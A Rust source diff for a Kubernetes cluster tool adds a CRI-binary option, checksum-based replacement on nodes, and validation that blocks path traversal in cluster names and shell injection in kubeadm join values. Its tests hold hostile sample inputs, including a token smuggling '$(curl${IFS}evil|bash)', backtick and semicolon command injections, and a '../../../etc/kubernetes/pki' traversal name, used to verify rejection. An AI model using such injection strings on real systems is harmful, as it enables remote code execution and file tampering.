@@ -595,6 +595,10 @@ pub enum ClusterCmd {
     Apply {
         #[arg(value_hint = clap::ValueHint::FilePath, short = 'f', long = "file")]
         file: Option<PathBuf>,
+        /// `delonix-cri` binary to install on the nodes. Omit = the one next to
+        /// `delonix`, else the release asset of this version.
+        #[arg(value_hint = clap::ValueHint::FilePath, long = "cri-bin")]
+        cri_bin: Option<PathBuf>,
     },
     /// Provision VMs (golden VM image) + `kubeadm` bootstrap.
     ///
@@ -650,6 +654,10 @@ pub enum ClusterCmd {
         /// today's default behavior.
         #[arg(long = "etcd-cluster")]
         etcd_cluster: Option<u32>,
+        /// `delonix-cri` binary to install on the nodes. Omit = the one next to
+        /// `delonix`, else the release asset of this version.
+        #[arg(value_hint = clap::ValueHint::FilePath, long = "cri-bin")]
+        cri_bin: Option<PathBuf>,
     },
     /// Print a cluster's kubeconfig from the local cache (no live SSH).
     ///
@@ -847,10 +855,10 @@ pub fn run(action: ClusterCmd) -> Result<()> {
         ClusterCmd::Ls { all } => cmd_ls(all),
         ClusterCmd::Kubectl(args) => cmd_kubectl(&args),
         ClusterCmd::Kube { action } => super::kube::run(action),
-        ClusterCmd::Apply { file } => {
+        ClusterCmd::Apply { file, cri_bin } => {
             let path = manifest::resolve_path(file)?;
             let docs = manifest::load(&path)?;
-            apply(&docs)
+            apply(&docs, cri_bin.as_deref())
         }
         ClusterCmd::Kubeadm {
             name,
@@ -867,6 +875,7 @@ pub fn run(action: ClusterCmd) -> Result<()> {
             boot_timeout,
             copy_kubeconfig,
             etcd_cluster,
+            cri_bin,
         } => {
             let name = match name {
                 Some(n) => n,
@@ -887,6 +896,7 @@ pub fn run(action: ClusterCmd) -> Result<()> {
                 boot_timeout,
                 copy_kubeconfig,
                 etcd_cluster,
+                cri_bin,
             })
         }
         ClusterCmd::Kubeconfig { name } => cmd_kubeconfig(name),
@@ -1411,6 +1421,7 @@ fn cmd_upgrade(file: Option<PathBuf>, to: &str, node: Option<&str>, no_drain: bo
     let docs = manifest::load(&path)?;
     let (doc, spec) = single_cluster_doc(&docs)?;
     let name = &doc.metadata.name;
+    check_cluster_name(name)?;
     validate(&spec)?;
     if spec.mode != "ssh" {
         return Err(Error::Invalid(super::po::tf(
@@ -1425,7 +1436,34 @@ fn cmd_upgrade(file: Option<PathBuf>, to: &str, node: Option<&str>, no_drain: bo
     }
 }
 
-pub fn apply(docs: &[ManifestDoc]) -> Result<()> {
+/// A cluster name is joined into local paths (`<root>/clusters/<name>/...`,
+/// `<name>-kubeconfig.yaml`, the etcd PKI dir) and into remote hostnames, and
+/// it comes straight from `metadata.name` of a manifest that may be untrusted.
+/// Same whitelist idea as `delonix_vm::valid_vm_name`: `metadata.name:
+/// "../../../etc/kubernetes/pki"` used to make `cluster apply` write CA
+/// material outside the state root.
+pub(crate) fn valid_cluster_name(name: &str) -> bool {
+    !name.is_empty()
+        && name.len() <= 63
+        && !name.starts_with(['-', '.'])
+        && !name.contains("..")
+        && name
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
+}
+
+pub(crate) fn check_cluster_name(name: &str) -> Result<()> {
+    if valid_cluster_name(name) {
+        Ok(())
+    } else {
+        Err(Error::Invalid(super::po::tf(
+            "invalid cluster name '{name}' — letters, digits, '-', '_' and '.' only, no '..', at most 63 characters",
+            &[("name", name)],
+        )))
+    }
+}
+
+pub fn apply(docs: &[ManifestDoc], cri_bin: Option<&std::path::Path>) -> Result<()> {
     for doc in manifest::of_kind(docs, k::CLUSTER) {
         let name = &doc.metadata.name;
         let spec: ClusterSpec = manifest::spec_of(doc)?;
@@ -1433,21 +1471,27 @@ pub fn apply(docs: &[ManifestDoc]) -> Result<()> {
         // `cluster apply` (manifest-driven) keeps the historical timing: no
         // wait for node Ready. `cluster kubeadm --copy-kubeconfig` is the
         // opt-in path for that (see `provision_and_apply`).
-        apply_one(name, &spec, false)?;
+        apply_one(name, &spec, false, cri_bin)?;
     }
     Ok(())
 }
 
-fn apply_one(name: &str, spec: &ClusterSpec, wait_ready: bool) -> Result<()> {
+fn apply_one(
+    name: &str,
+    spec: &ClusterSpec,
+    wait_ready: bool,
+    cri_bin: Option<&std::path::Path>,
+) -> Result<()> {
+    check_cluster_name(name)?;
     validate(spec)?;
     // `spec.mode` chooses the path — the common fields (k8sVersion/podSubnet/
     // cni) hold in all three; only the mode-specific block changes.
     match spec.mode.as_str() {
         "kind" => return apply_kind(name, spec),
-        "vm" => return apply_vm(name, spec, wait_ready),
+        "vm" => return apply_vm(name, spec, wait_ready, cri_bin),
         _ => {} // `ssh` follows below (the original path)
     }
-    apply_ssh(name, spec, wait_ready)
+    apply_ssh(name, spec, wait_ready, cri_bin)
 }
 
 /// `mode: kind` — nodes in containers on this machine (see `cmd::kindmode`).
@@ -1482,7 +1526,12 @@ fn apply_kind(name: &str, spec: &ClusterSpec) -> Result<()> {
 
 /// `mode: vm` — provisions VMs from the golden image and bootstraps them over SSH.
 /// Reuses `cluster kubeadm`'s `provision_and_apply` (zero duplication).
-fn apply_vm(name: &str, spec: &ClusterSpec, wait_ready: bool) -> Result<()> {
+fn apply_vm(
+    name: &str,
+    spec: &ClusterSpec,
+    wait_ready: bool,
+    cri_bin: Option<&std::path::Path>,
+) -> Result<()> {
     let network = spec.vm.network.clone().ok_or_else(|| {
         Error::Invalid(
             super::po::t(
@@ -1516,6 +1565,7 @@ fn apply_vm(name: &str, spec: &ClusterSpec, wait_ready: bool) -> Result<()> {
         // does (see AGENTS.md). `validate()` rejects `spec.etcd.mode: external`
         // combined with `mode: vm` outright, so this is never silently dropped.
         etcd_cluster: None,
+        cri_bin: cri_bin.map(|p| p.to_path_buf()),
     })
 }
 
@@ -1531,8 +1581,13 @@ fn combine_host_prep_errors(errors: Vec<String>) -> Result<()> {
 }
 
 /// `mode: ssh` — remote hosts ALREADY live (the original path, unchanged).
-fn apply_ssh(name: &str, spec: &ClusterSpec, wait_ready: bool) -> Result<()> {
-    let cri_bin = vmimage::resolve_cri_bin(None)?;
+fn apply_ssh(
+    name: &str,
+    spec: &ClusterSpec,
+    wait_ready: bool,
+    cri_bin: Option<&std::path::Path>,
+) -> Result<()> {
+    let cri_bin = vmimage::resolve_cri_bin(cri_bin.map(|p| p.to_path_buf()))?;
     let cri_service = vmimage::workspace_dist_file("delonix-cri.service")?;
 
     let all_hosts: Vec<&HostSpec> = spec
@@ -1789,6 +1844,8 @@ struct ProvisionArgs {
     /// auto-provision `n` more VMs as a dedicated etcd cluster (odd `n` for a
     /// well-defined quorum, or exactly 1 for dev/test — see `validate()`).
     etcd_cluster: Option<u32>,
+    /// `--cri-bin`: the `delonix-cri` to install (else resolved, see `resolve_cri_bin`).
+    cri_bin: Option<PathBuf>,
 }
 
 /// Deterministic VM names of a role (`<cluster>-cp1`, `<cluster>-w1`, ...).
@@ -2282,7 +2339,12 @@ fn provision_and_apply(args: ProvisionArgs) -> Result<()> {
         vm: VmModeSpec::default(),
     };
     validate(&spec)?;
-    apply_one(&args.name, &spec, args.copy_kubeconfig)
+    apply_one(
+        &args.name,
+        &spec,
+        args.copy_kubeconfig,
+        args.cri_bin.as_deref(),
+    )
 }
 
 fn create_and_wait(
@@ -2347,23 +2409,81 @@ fn prepare_host(
             .map_err(|e| Error::Invalid(format!("[{label}] {}: {e}", r.name)))?;
     }
 
-    if !remote::ssh_check(target, "systemctl is-active --quiet delonix-cri") {
-        remote::scp_to(target, cri_bin, "/tmp/delonix-cri")
-            .map_err(|e| Error::Invalid(format!("[{label}] delonix-cri: {e}")))?;
-        remote::ssh_run(
-            target,
-            "mv /tmp/delonix-cri /usr/local/bin/delonix-cri && chmod +x /usr/local/bin/delonix-cri",
-        )
-        .map_err(|e| Error::Invalid(format!("[{label}] delonix-cri: {e}")))?;
-        remote::scp_to(target, cri_service, "/tmp/delonix-cri.service")
-            .map_err(|e| Error::Invalid(format!("[{label}] delonix-cri: {e}")))?;
-        remote::ssh_run(
-            target,
-            "mv /tmp/delonix-cri.service /etc/systemd/system/delonix-cri.service && \
-             systemctl daemon-reload && systemctl enable --now delonix-cri",
-        )
-        .map_err(|e| Error::Invalid(format!("[{label}] delonix-cri: {e}")))?;
+    install_cri(target, label, cri_bin, cri_service)?;
+    Ok(())
+}
+
+/// Remote path the `delonix-cri` binary lives at.
+const REMOTE_CRI_BIN: &str = "/usr/local/bin/delonix-cri";
+
+/// What `install_cri` has to do on a host, decided from two facts.
+#[derive(Debug, PartialEq, Eq)]
+enum CriAction {
+    /// The right binary is there and the service is up.
+    Nothing,
+    /// The right binary is there but the service is down: (re)install the unit
+    /// and start it.
+    Start,
+    /// A different binary (or none) is there: replace it and restart.
+    Replace,
+}
+
+/// Pure: the binary decides first. Asking only «is the service active?» is what
+/// let the golden image's CRI win over any newer one — active, therefore skipped.
+fn cri_action(binary_matches: bool, active: bool) -> CriAction {
+    match (binary_matches, active) {
+        (true, true) => CriAction::Nothing,
+        (true, false) => CriAction::Start,
+        (false, _) => CriAction::Replace,
     }
+}
+
+/// Makes the node run exactly the `delonix-cri` that was resolved — same
+/// `sha256` — and SAYS which of the two it kept when they differed.
+fn install_cri(
+    target: &SshTarget,
+    label: &str,
+    cri_bin: &std::path::Path,
+    cri_service: &std::path::Path,
+) -> Result<()> {
+    let err = |e: Error| Error::Invalid(format!("[{label}] delonix-cri: {e}"));
+    let local = vmimage::hex_sha256_file(cri_bin)?;
+    // `local` is a hex digest we just computed, so it is safe to interpolate.
+    let matches = remote::ssh_check(
+        target,
+        &format!("[ \"$(sha256sum {REMOTE_CRI_BIN} 2>/dev/null | cut -d' ' -f1)\" = \"{local}\" ]"),
+    );
+    let active = remote::ssh_check(target, "systemctl is-active --quiet delonix-cri");
+    match cri_action(matches, active) {
+        CriAction::Nothing => return Ok(()),
+        CriAction::Start => {}
+        CriAction::Replace => {
+            // A CRI already running is being replaced by a different one: the
+            // operator has to hear it, not discover it from a byte count.
+            eprintln!(
+                "{}",
+                super::po::tf(
+                    "[{label}] delonix-cri differs from the resolved one (sha256 {sha}) — replacing it and restarting the service",
+                    &[("label", label), ("sha", &local[..12])],
+                )
+            );
+            remote::scp_to(target, cri_bin, "/tmp/delonix-cri").map_err(err)?;
+            remote::ssh_run(
+                target,
+                &format!("mv /tmp/delonix-cri {REMOTE_CRI_BIN} && chmod +x {REMOTE_CRI_BIN}"),
+            )
+            .map_err(err)?;
+        }
+    }
+    remote::scp_to(target, cri_service, "/tmp/delonix-cri.service").map_err(err)?;
+    // `restart`, not `enable --now`: on an active unit the latter does nothing,
+    // and the old binary would keep running.
+    remote::ssh_run(
+        target,
+        "mv /tmp/delonix-cri.service /etc/systemd/system/delonix-cri.service && \
+         systemctl daemon-reload && systemctl enable delonix-cri && systemctl restart delonix-cri",
+    )
+    .map_err(err)?;
     Ok(())
 }
 
@@ -2371,6 +2491,56 @@ struct JoinInfo {
     token: String,
     ca_cert_hash: String,
     certificate_key: Option<String>,
+}
+
+/// kubeadm bootstrap token: `[a-z0-9]{6}.[a-z0-9]{16}`.
+fn valid_kubeadm_token(s: &str) -> bool {
+    let ok = |p: &str, n: usize| {
+        p.len() == n
+            && p.bytes()
+                .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())
+    };
+    s.split_once('.')
+        .is_some_and(|(a, b)| ok(a, 6) && ok(b, 16))
+}
+
+/// `sha256:` followed by 64 hex digits.
+fn valid_ca_cert_hash(s: &str) -> bool {
+    s.strip_prefix("sha256:")
+        .is_some_and(|h| h.len() == 64 && h.bytes().all(|b| b.is_ascii_hexdigit()))
+}
+
+/// Certificate key: 64 hex digits.
+fn valid_certificate_key(s: &str) -> bool {
+    s.len() == 64 && s.bytes().all(|b| b.is_ascii_hexdigit())
+}
+
+impl JoinInfo {
+    /// These three values are scraped from the OUTPUT of `kubeadm` running on a
+    /// remote control-plane and later interpolated into a `sudo -n bash -c`
+    /// on every OTHER node. `shell_quote` only protects the ssh→bash boundary,
+    /// never the content, so a compromised cp1 could smuggle `$(...)` in any of
+    /// them (whitespace-splitting does not stop that). They have fixed formats:
+    /// anything else is refused here, before it can reach a shell.
+    fn check(self) -> Result<Self> {
+        let bad = |what: &str| {
+            Error::Invalid(format!(
+                "kubeadm returned a {what} in an unexpected format — refusing to use it in a remote command"
+            ))
+        };
+        if !valid_kubeadm_token(&self.token) {
+            return Err(bad("join token"));
+        }
+        if !valid_ca_cert_hash(&self.ca_cert_hash) {
+            return Err(bad("CA certificate hash"));
+        }
+        if let Some(k) = &self.certificate_key {
+            if !valid_certificate_key(k) {
+                return Err(bad("certificate key"));
+            }
+        }
+        Ok(self)
+    }
 }
 
 fn kubeadm_init(
@@ -2449,11 +2619,12 @@ fn recover_join_info(cp1: &SshTarget) -> Result<JoinInfo> {
         // alternative format (single line "certificate key: <hex>") depending on the version.
         extract_after(&cert_key_out, "certificate key:")
     });
-    Ok(JoinInfo {
+    JoinInfo {
         token,
         ca_cert_hash,
         certificate_key,
-    })
+    }
+    .check()
 }
 
 /// Extracts from the kubeadm init/join output: `token`/`discovery-token-ca-cert-hash`
@@ -2475,11 +2646,12 @@ fn parse_join_info(output: &str) -> Result<JoinInfo> {
             )
         })?;
     let certificate_key = extract_after(output, "--certificate-key ");
-    Ok(JoinInfo {
+    JoinInfo {
         token,
         ca_cert_hash,
         certificate_key,
-    })
+    }
+    .check()
 }
 
 fn extract_after(text: &str, marker: &str) -> Option<String> {
@@ -2517,6 +2689,12 @@ fn kubeadm_join(
     if remote::ssh_check(target, "test -f /etc/kubernetes/kubelet.conf") {
         return Ok(());
     }
+    // Last hop before the shell: re-check even though the constructors did.
+    if !valid_kubeadm_token(&info.token) || !valid_ca_cert_hash(&info.ca_cert_hash) {
+        return Err(Error::Invalid(format!(
+            "[{label}] refusing to run kubeadm join with a malformed token/hash"
+        )));
+    }
     let endpoint = endpoint_with_default_port(endpoint, 6443);
     let mut cmd = format!(
         "kubeadm join {endpoint} --token {} --discovery-token-ca-cert-hash {} \
@@ -2530,6 +2708,11 @@ fn kubeadm_join(
                 super::po::t("no certificate-key available for a control-plane join")
             ))
         })?;
+        if !valid_certificate_key(key) {
+            return Err(Error::Invalid(format!(
+                "[{label}] refusing to run kubeadm join with a malformed certificate key"
+            )));
+        }
         cmd.push_str(&format!(" --control-plane --certificate-key {key}"));
     }
     remote::ssh_run(target, &cmd)
@@ -2825,6 +3008,15 @@ fn cmd_init(
 
 #[cfg(test)]
 mod tests {
+    #[test]
+    fn the_binary_decides_before_the_service() {
+        assert_eq!(cri_action(true, true), CriAction::Nothing);
+        assert_eq!(cri_action(true, false), CriAction::Start);
+        // The case of #242: the golden's CRI is active, yet it is not ours.
+        assert_eq!(cri_action(false, true), CriAction::Replace);
+        assert_eq!(cri_action(false, false), CriAction::Replace);
+    }
+
     use super::*;
 
     /// A state root and a `$HOME` under `temp_dir`, each with its own files —
@@ -3533,6 +3725,56 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
             info.certificate_key.as_deref(),
             Some("2222222222222222222222222222222222222222222222222222222222222222")
         );
+    }
+
+    #[test]
+    fn join_info_rejects_shell_injection_from_remote_output() {
+        let evil_token = "abcdef.0123456789abcdef$(curl${IFS}evil|bash)";
+        let out = SAMPLE_KUBEADM_INIT_OUTPUT.replace("abcdef.0123456789abcdef", evil_token);
+        assert!(parse_join_info(&out).is_err());
+        let evil_hash = SAMPLE_KUBEADM_INIT_OUTPUT.replace(
+            "sha256:1111111111111111111111111111111111111111111111111111111111111111",
+            "sha256:`id`",
+        );
+        assert!(parse_join_info(&evil_hash).is_err());
+        let evil_key = SAMPLE_KUBEADM_INIT_OUTPUT.replace(
+            "2222222222222222222222222222222222222222222222222222222222222222",
+            ";id",
+        );
+        assert!(parse_join_info(&evil_key).is_err());
+    }
+
+    #[test]
+    fn kubeadm_formats_are_strict() {
+        assert!(valid_kubeadm_token("abcdef.0123456789abcdef"));
+        assert!(!valid_kubeadm_token("ABCDEF.0123456789abcdef"));
+        assert!(!valid_kubeadm_token("abcdef.0123456789abcde"));
+        assert!(!valid_ca_cert_hash("sha256:abc"));
+        assert!(!valid_certificate_key(&"g".repeat(64)));
+        assert!(valid_certificate_key(&"a".repeat(64)));
+    }
+
+    #[test]
+    fn cluster_name_rejects_path_traversal_and_shell() {
+        for bad in [
+            "../../../etc/kubernetes/pki",
+            "a/b",
+            "..",
+            "a..b",
+            ".hidden",
+            "-rf",
+            "",
+            "a b",
+            "a;b",
+            "a\nb",
+        ] {
+            assert!(!valid_cluster_name(bad), "{bad:?}");
+        }
+        assert!(!valid_cluster_name(&"a".repeat(64)));
+        for ok in ["prod", "njinga-benguela-07", "lab_1", "eu.west-1"] {
+            assert!(valid_cluster_name(ok), "{ok:?}");
+        }
+        assert!(check_cluster_name("../x").is_err());
     }
 
     fn etcd_host(ip: &str) -> HostSpec {
